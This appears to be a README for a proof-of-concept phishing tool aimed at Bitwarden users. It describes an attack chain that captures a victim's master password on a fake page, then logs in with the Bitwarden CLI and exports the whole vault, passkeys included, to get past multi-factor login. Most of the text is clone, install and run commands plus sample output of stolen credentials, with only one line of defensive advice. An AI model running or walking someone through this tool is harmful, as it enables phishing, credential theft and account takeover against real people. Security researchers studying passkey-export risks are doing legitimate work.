# Bitwarden Phishing Tool
This tool is meant as a proof-of-concept only and is not intended to be a weaponized exploit.

## A Note on Synced Passkeys
Bitwarden like every other provider approaches this problem differently. Bitwarden's Browser extensions don't store the passwords or passkeys locally in a level-db. It is stored somewhere on their servers, but they do let you export them as a json or csv.

Most password managers provide support for exporting your stored credentials, and that is fine. To let passkey get exported is a design choice, chrome doesn't provide you this but Bitwarden does, which does more harm in case of this attack.

## Attack Chain
1. Launch the Bitwarden phisher
2. Have a victim browse the page
3. Use Bitwarden cli to login and export all the credentials including passkeys
4. Import these into your own Bitwarden account and bypass Login, Multi-Factor etc easily

# Defense
Use device-bound keys for now.

# Installation & Usage

Everything is written in node, so should be pretty easy to setup
```bash
git clone https://github.com/Allthenticate/yourpasskeyisweak.git
cd yourpasskeyisweak/bitwarden/
```

This installs the dependencies including biwarden/cli, and servers the phishing page on port 3000
```bash
npm install
node server.js
```

If the victim has fallen for the attack, the stdout should be something like this
```bash
Server is running at http://localhost:3001
Ready to receive login data...
Received login details:
Username: passkeyvictim
Password: myweakpassword
User data successfully written to credentials.txt
```

On a different terminal run,
```bash
./login.sh
```

This will try to login into the Bitwarden account and then export the credentials in a json file.
```bash
[master][~/yourpasskeyisweak/bitwarden]$ ./login.sh
Logging in: passkey@victim.com myweakpassword
Login successful for passkey@victim.com
Saved /root/yourpasskeyisweak/bitwarden/passkey_victim_com_data.json
Exported vault to lpasskey_victim_com_data.json
You have logged out.
```
